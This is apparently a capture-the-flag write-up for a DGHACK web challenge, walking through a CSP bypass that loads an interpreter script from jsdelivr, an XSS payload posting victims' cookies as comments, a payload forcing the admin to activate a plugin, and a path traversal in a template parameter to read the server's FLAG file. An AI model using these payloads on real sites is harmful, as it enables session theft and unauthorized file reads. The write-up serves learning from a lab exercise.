```
Trouvez le contenu du fichier FLAG présent à la racine du serveur.
```
I tried XSS on login, but that didn't work before of this CSP in the header:

```html
    <meta http-equiv="Content-Security-Policy" content="script-src https://cdn.jsdelivr.net/" />
```

We can bypass it using this script because the CDN is unsafe.

Let's try to steal cookies ?

We use this payload to force people to post their cookie as comment:

```javascript
  <script src="https://cdn.jsdelivr.net/npm/csp-bypass@1.0.2/dist/sval-classic.min.js"></script>
  <br csp="var xhr = new XMLHttpRequest(); xhr.open('POST', '/new-post', true); xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded'); xhr.send('title=Hacked!&text=' + encodeURIComponent(document.cookie));">
```

We log as Johnny.
We send a message to admin with the same payload, because it doesn't seems to post his cookie...

And he does post it !

But we get rejected because our request doesn't come from localhost !

So we are going to force the admin to do it, with this payload:

```javascript
  <script src="https://cdn.jsdelivr.net/npm/csp-bypass@1.0.2/dist/sval-classic.min.js"></script>
  <br csp="var xhr = new XMLHttpRequest(); xhr.open('GET', '/activate-plugin/1', true); xhr.send();">
```

Template is activated.
Now we use the vuln that we find in the `https://github.com/jhonnyCtfSysdream/JhonnyTemplater/blob/main/JohnnyTemplater/__init__.py` file:
```python
f = open("app/texts/" + theme, 'r')
```

Looks like an LFI !

```
POST /new-post HTTP/1.1
[...]
theme=funny&submit-template=&title=&text=
```

We turn this to:
```
POST /new-post HTTP/1.1
[...]
theme=../../../../../../../FLAG&submit-template=&title=&text=
```

And we get the flag: `DGHACK{WellD0ne!Bl0ggingIsS0metimeRisky}`